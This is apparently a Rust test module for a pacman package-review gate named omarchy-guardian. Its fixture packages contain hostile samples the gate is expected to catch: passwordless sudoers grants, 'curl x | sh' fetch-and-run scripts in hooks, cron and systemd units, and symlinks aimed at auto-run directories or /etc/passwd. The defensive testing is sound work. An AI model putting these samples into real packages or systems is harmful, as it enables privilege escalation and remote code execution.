        let names = ".PKGINFO\netc/\netc/sudoers.d/a -> b\netc/sudoers.d/l\netc/sudoers.d/h\n";
        let details = [
            detail('-', 10, ".PKGINFO"),
            detail('d', 0, "etc/"),
            detail('-', 2, "etc/sudoers.d/a -> b"),
            detail('l', 0, "etc/sudoers.d/l -> ../x"),
            detail('h', 0, "etc/sudoers.d/h link to etc/sudoers.d/a -> b"),
        ]
        .join("\n");
        let model = parse_model(names, &details).unwrap();
        assert_eq!(
            model[2],
            Entry {
                path: "etc/sudoers.d/a -> b".into(),
                size: 2,
                kind: Kind::File,
                root_set_id: None
            }
        );
        assert_eq!(model[3].kind, Kind::Symlink("../x".into()));
        assert_eq!(model[4].kind, Kind::HardLink("etc/sudoers.d/a -> b".into()));
        assert_eq!(model[1].path, "etc");
    }

    #[test]
    fn the_model_refuses_what_libalpm_would_install_elsewhere() {
        let refused = |name: &str, kind: char| {
            parse_model(&format!("{name}\n"), &detail(kind, 1, name)).is_err()
        };
        for name in [
            "etc//sudoers.d/x",
            "etc/./sudoers.d/x",
            "/etc/sudoers.d/x",
            "usr/../etc/x",
            ".hidden",
            "./etc/x",
        ] {
            assert!(refused(name, '-'), "{name}");
        }
        // Metadata must be a regular file, and nothing may appear twice.
        assert!(refused(".INSTALL", 'l'));
        let twice = parse_model(
            ".INSTALL\n.INSTALL\n",
            &[detail('-', 1, ".INSTALL"), detail('-', 1, ".INSTALL")].join("\n"),
        );
        assert!(twice.is_err());
        // Hard links must name an earlier regular entry.
        assert!(parse_model("etc/x\n", &detail('h', 0, "etc/x link to etc/y")).is_err());
        // Entries under a symbolic-link directory, mismatched listings and
        // unknown types.
        assert!(
            parse_model(
                "etc/d\netc/d/x\n",
                &[detail('l', 0, "etc/d -> /etc"), detail('-', 1, "etc/d/x")].join("\n")
            )
            .is_err()
        );
        assert!(parse_model("a\nb\n", &detail('-', 1, "a")).is_err());
        assert!(parse_model("dev\n", &detail('c', 0, "dev")).is_err());
    }

    #[test]
    fn protected_paths_need_their_owner() {
        let official = SourceClass::Official;
        let local = SourceClass::LocalPackage;
        assert!(
            protected_violation("etc/omarchy-guardian/config.toml", "evil", local, &[]).is_some()
        );
        assert!(
            protected_violation("etc/omarchy-guardian/config.toml", "evil", official, &[])
                .is_some()
        );
        assert!(protected_violation("usr/bin/opencode", "opencode", official, &[]).is_none());
        assert!(
            protected_violation(
                "usr/bin/opencode",
                "opencode",
                SourceClass::ThirdPartyRepo,
                &[]
            )
            .is_some()
        );
        assert!(
            protected_violation(
                "usr/bin/opencode",
                "opencode-bin",
                SourceClass::ThirdPartyRepo,
                &["opencode-bin".into()]
            )
            .is_none()
        );
        assert!(protected_violation("usr/local/bin/claude", "anything", local, &[]).is_some());
        assert!(
            protected_violation("usr/lib/omarchy-guardian/x", "omarchy-guardian", local, &[])
                .is_none()
        );
        assert!(
            protected_violation(
                "usr/bin/bsdtar",
                "libarchive-git",
                SourceClass::ThirdPartyRepo,
                &[]
            )
            .is_some()
        );
        assert!(protected_violation("usr/bin/foo", "anything", local, &[]).is_none());
        // The gate itself comes from the user's own build or an official
        // repository, not from whichever repository offers that name.
        for path in [
            "usr/bin/omarchy-guardian",
            "usr/lib/omarchy-guardian/guardian-pacman-hook",
            "usr/share/omarchy-guardian/omarchy-guardian.hook",
        ] {
            assert!(protected_violation(path, "omarchy-guardian", local, &[]).is_none());
            assert!(protected_violation(path, "omarchy-guardian", official, &[]).is_none());
            assert!(
                protected_violation(path, "omarchy-guardian", SourceClass::ThirdPartyRepo, &[])
                    .is_some(),
                "{path}"
            );
        }
    }

    fn build(root: &Path, archive: &Path, members: &[&str], extra: &[&str]) {
        let status = Command::new("/usr/bin/bsdtar")
            .arg("-cf")
            .arg(archive)
            .args(extra)
            .args(members)
            .current_dir(root)
            .status()
            .unwrap();
        assert!(status.success());
    }

    #[test]
    fn reviews_the_scriptlet_auto_run_files_links_and_executed_scripts() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload");
        let root = dir.path().join("root");
        let units = root.join("usr/lib/systemd/system");
        fs::create_dir_all(units.join("multi-user.target.wants")).unwrap();
        fs::create_dir_all(root.join("etc/sudoers.d")).unwrap();
        fs::create_dir_all(root.join("usr/share/libalpm/hooks")).unwrap();
        fs::create_dir_all(root.join("usr/share/x")).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = x\npkgver = 1-1\n").unwrap();
        fs::write(root.join(".INSTALL"), "post_install() { echo hi; }\n").unwrap();
        fs::write(units.join("x.service"), "[Service]\nExecStart=/usr/bin/x\n").unwrap();
        symlink(
            "../x.service",
            units.join("multi-user.target.wants/x.service"),
        )
        .unwrap();
        fs::write(
            root.join("etc/sudoers.d/x"),
            b"x ALL=(ALL) NOPASSWD: ALL # caf\xe9\n",
        )
        .unwrap();
        fs::write(
            root.join("usr/share/libalpm/hooks/x.hook"),
            "[Action]\nExec = /usr/share/x/run.sh\n",
        )
        .unwrap();
        fs::write(root.join("usr/share/x/run.sh"), "#!/bin/sh\ncurl x | sh\n").unwrap();
        let archive = dir.path().join("x-1-1-any.pkg.tar");
        build(
            &root,
            &archive,
            &[".PKGINFO", ".INSTALL", "usr", "etc"],
            &[],
        );

        let opened = Archive::open(&archive).unwrap();
        let reviewed = review(&opened, "x", SourceClass::LocalPackage, &[]).unwrap();
        assert_eq!(
            reviewed.install,
            Some(Content::Text("post_install() { echo hi; }\n".into()))
        );
        let paths: Vec<&str> = reviewed
            .files
            .iter()
            .map(|file| file.path.as_str())
            .collect();
        assert_eq!(
            paths,
            [
                "etc/sudoers.d/x",
                "usr/lib/systemd/system/multi-user.target.wants/x.service",
                "usr/share/libalpm/hooks/x.hook",
                "usr/share/x/run.sh",
            ]
        );
        assert!(
            matches!(&reviewed.files[0].content, Content::Lossy { text, .. } if text.contains("NOPASSWD"))
        );
        let Content::Text(unit) = &reviewed.files[1].content else {
            panic!()
        };
        assert!(unit.contains("ExecStart=/usr/bin/x"), "{unit}");
        let Content::Text(run) = &reviewed.files[3].content else {
            panic!()
        };
        assert!(
            run.contains("run by /usr/share/libalpm/hooks/x.hook") && run.contains("curl x | sh")
        );
        opened.verify_unchanged().unwrap();

        // The declared name must be the transaction target.
        assert!(review(&opened, "y", SourceClass::LocalPackage, &[]).is_err());

        // Installed copies that match are recognised; a changed one is not.
        let installed = dir.path().join("installed");
        fs::create_dir_all(installed.join("etc/sudoers.d")).unwrap();
        fs::write(
            installed.join("etc/sudoers.d/x"),
            b"x ALL=(ALL) NOPASSWD: ALL # caf\xe9\n",
        )
        .unwrap();
        assert!(reviewed.files[0].is_installed_unchanged(&installed));
        fs::write(installed.join("etc/sudoers.d/x"), "x ALL=(ALL) ALL\n").unwrap();
        assert!(!reviewed.files[0].is_installed_unchanged(&installed));
    }

    #[test]
    fn an_enabling_link_is_unchanged_only_while_its_unit_is() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-enabled");
        let unit = "usr/lib/systemd/system/x.service";
        let link = "usr/lib/systemd/system/multi-user.target.wants/x.service";
        // The same tree is the package and, with another unit, the system.
        let lay_out = |name: &str, exec: &str| {
            let root = dir.path().join(name);
            fs::create_dir_all(root.join(link).parent().unwrap()).unwrap();
            fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
            fs::write(root.join(unit), format!("[Service]\nExecStart={exec}\n")).unwrap();
            symlink("../x.service", root.join(link)).unwrap();
            root
        };
        let root = lay_out("package", "/usr/bin/sh -c 'curl x | sh'");
        let archive = dir.path().join("x-2-1-any.pkg.tar");
        build(&root, &archive, &[".PKGINFO", "usr"], &[]);
        let opened = Archive::open(&archive).unwrap();
        let reviewed = review(&opened, "x", SourceClass::LocalPackage, &[]).unwrap();
        let enabled = &reviewed.files[0];
        assert_eq!(enabled.path, link);

        // The link is the same; what it enables is not.
        let before = lay_out("before", "/usr/bin/x");
        assert!(!enabled.is_installed_unchanged(&before));
        assert!(enabled.is_installed_unchanged(&root));
    }

    #[test]
    fn a_link_standing_in_for_an_auto_run_directory_is_refused() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        assert_eq!(
            lexical_target("etc/xdg/systemd/user", "../../systemd/user").as_deref(),
            Some("etc/systemd/user")
        );
        assert_eq!(
            lexical_target("etc/cron.d", "/usr/share/x").as_deref(),
            Some("usr/share/x")
        );
        assert_eq!(lexical_target("etc/cron.d", "../../x"), None);
        // `lib` is a link on the system: the text says etc/cron.d, the
        // system goes to usr/etc/cron.d.
        assert_eq!(lexical_target("etc/cron.d", "../lib/../etc/cron.d"), None);
        assert_eq!(lexical_target("etc/cron.d", "/etc/x/../cron.d"), None);
        for (name, link, target) in [
            ("sleep", "etc/systemd/system-sleep", "/usr/share/x/run"),
            ("cron", "etc/cron.d", "/usr/share/x/run"),
            (
                "wants",
                "usr/lib/systemd/system/multi-user.target.wants",
                "/usr/share/x/run",
            ),
            // Through a name that may be a link, to files of another kind,
            // below a catalogued directory, or a unit directory in /etc.
            ("climb", "etc/cron.d", "../lib/../etc/cron.daily"),
            ("kind", "etc/sudoers.d", "../usr/local/bin"),
            ("below", "etc/xdg/systemd/user", "../../systemd/user/sub"),
            (
                "etc-wants",
                "etc/systemd/system/multi-user.target.wants",
                "/tmp",
            ),
        ] {
            let dir = TempDir::new(&format!("payload-dirlink-{name}"));
            let root = dir.path().join("root");
            fs::create_dir_all(root.join("usr/share/x/run")).unwrap();
            fs::create_dir_all(root.join(link).parent().unwrap()).unwrap();
            fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
            fs::write(root.join("usr/share/x/run/job"), "#!/bin/sh\ncurl x | sh\n").unwrap();
            symlink(target, root.join(link)).unwrap();
            let archive = dir.path().join("x-1-1-any.pkg.tar");
            let members: Vec<&str> = [".PKGINFO", "etc", "usr"]
                .into_iter()
                .filter(|member| root.join(member).exists())
                .collect();
            build(&root, &archive, &members, &[]);
            let opened = Archive::open(&archive).unwrap();
            let error = review(&opened, "x", SourceClass::LocalPackage, &[])
                .err()
                .unwrap();
            assert!(
                error.to_string().contains("standing in for a directory"),
                "{name}: {error}"
            );
        }
    }

    #[test]
    fn a_link_to_another_auto_run_directory_is_systemds_own_layout() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-dirlink-systemd");
        let root = dir.path().join("root");
        fs::create_dir_all(root.join("etc/xdg/systemd")).unwrap();
        fs::create_dir_all(root.join("etc/systemd/user")).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = systemd\n").unwrap();
        fs::write(
            root.join("etc/systemd/user/x.service"),
            "[Service]\nExecStart=/usr/bin/x\n",
        )
        .unwrap();
        symlink("../../systemd/user", root.join("etc/xdg/systemd/user")).unwrap();
        let archive = dir.path().join("systemd-1-1-any.pkg.tar");
        build(&root, &archive, &[".PKGINFO", "etc"], &[]);
        let opened = Archive::open(&archive).unwrap();
        let reviewed = review(&opened, "systemd", SourceClass::Official, &[]).unwrap();
        let paths: Vec<&str> = reviewed
            .files
            .iter()
            .map(|file| file.path.as_str())
            .collect();
        assert_eq!(paths, ["etc/systemd/user/x.service"]);
    }

    #[test]
    fn links_out_of_the_package_or_through_links_are_notes_or_refusals() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-links");
        let root = dir.path().join("root");
        fs::create_dir_all(root.join("etc/sudoers.d")).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
        symlink(
            "/usr/lib/systemd/system/other.service",
            root.join("etc/sudoers.d/out"),
        )
        .unwrap();
        let archive = dir.path().join("x-1-1-any.pkg.tar");
        build(&root, &archive, &[".PKGINFO", "etc"], &[]);
        let opened = Archive::open(&archive).unwrap();
        assert_eq!(
            opened.resolve("etc/sudoers.d/out", "/usr/lib/systemd/system/other.service"),
            Ok(Resolution::Outside(
                "/usr/lib/systemd/system/other.service".into()
            ))
        );
        let reviewed = review(&opened, "x", SourceClass::LocalPackage, &[]).unwrap();
        assert!(
            matches!(&reviewed.files[0].content, Content::Text(text) if text.contains("does not ship"))
        );

        // d -> /etc and e -> d/passwd: through a link, refused, host never read.
        let root = dir.path().join("root2");
        fs::create_dir_all(root.join("etc/sudoers.d")).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
        symlink("/etc", root.join("etc/sudoers.d/d")).unwrap();
        symlink("d/passwd", root.join("etc/sudoers.d/e")).unwrap();
        let archive = dir.path().join("x2-1-1-any.pkg.tar");
        build(&root, &archive, &[".PKGINFO", "etc"], &[]);
        let opened = Archive::open(&archive).unwrap();
        assert!(review(&opened, "x", SourceClass::LocalPackage, &[]).is_err());
    }

    #[test]
    fn a_space_in_the_owner_name_does_not_hide_a_sudoers_file() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-owner");
        let root = dir.path().join("root");
        fs::create_dir_all(root.join("etc/sudoers.d")).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
        fs::write(
            root.join("etc/sudoers.d/x"),
            "ALL ALL=(ALL) NOPASSWD: ALL\n",
        )
        .unwrap();
        let archive = dir.path().join("x-1-1-any.pkg.tar");
        build(
            &root,
            &archive,
            &[".PKGINFO", "etc"],
            &["--uname", "a b", "--gname", "c d"],
        );
        let opened = Archive::open(&archive).unwrap();
        let reviewed = review(&opened, "x", SourceClass::LocalPackage, &[]).unwrap();
        assert_eq!(reviewed.files.len(), 1);
        assert!(
            matches!(&reviewed.files[0].content, Content::Text(text) if text.contains("NOPASSWD"))
        );
    }

    #[test]
    fn a_protected_path_from_the_wrong_package_is_refused() {
        if !tool_available("/usr/bin/bsdtar") {
            return;
        }
        let dir = TempDir::new("payload-protected");
        let root = dir.path().join("root");
        fs::create_dir_all(root.join("etc/omarchy-guardian")).unwrap();
        fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
        fs::write(
            root.join("etc/omarchy-guardian/config.toml"),
            "profile = \"local-only\"\n",
        )
        .unwrap();
        let archive = dir.path().join("x-1-1-any.pkg.tar");
        build(&root, &archive, &[".PKGINFO", "etc"], &[]);
        let opened = Archive::open(&archive).unwrap();
        let error = review(&opened, "x", SourceClass::Official, &[])
            .err()
            .unwrap();
        assert!(error.to_string().contains("disarm Guardian"), "{error}");
    }
}
